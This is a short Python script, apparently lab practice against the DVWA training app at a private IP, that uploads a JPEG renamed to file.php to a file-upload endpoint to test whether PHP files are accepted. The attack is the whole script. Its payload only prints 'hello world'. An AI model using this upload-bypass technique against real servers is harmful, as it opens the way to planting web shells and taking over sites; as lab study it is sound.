#! /usr/bin/python

import requests

headers1 = {'Content-Type': 'image/jpeg', 'Content-Disposition': 'form-data;name=\"uploaded\"; filename=\"file.php\"'}
headers2 = {'Content-Disposition': 'form-data;name=\"MAX_FILE_SIZE\"'}
headers3 = {'Content-Disposition': 'form-data;name=\"Upload\"'}

multipart_form_data = {
    'uploaded': ('file.php', open('./outro.jpeg', 'rb')),
    'MAX_FILE_SIZE': ('', '100000'),
    'Upload': ('', 'Upload')
}

data = "<?php echo \"hello world\"; ?>"

#r = requests.post('http://10.0.23.21/vulnerabilities/upload/', files=multipart_form_data);
req = requests.Request('POST', 'http://10.0.23.21/vulnerabilities/upload/', files=multipart_form_data);
prep = req.prepare()

def pretty_print_POST(req):
    """
    At this point it is completely built and ready
    to be fired; it is "prepared".

    However pay attention at the formatting used in 
    this function because it is programmed to be pretty 
    printed and may differ from the actual request.
    """
    print('{}\n{}\n{}\n\n{}'.format(
        '-----------START-----------',
        req.method + ' ' + req.url,
        '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    ))



pretty_print_POST(prep)
s = requests.Session()
r = s.send(prep)
print(str(r.text))
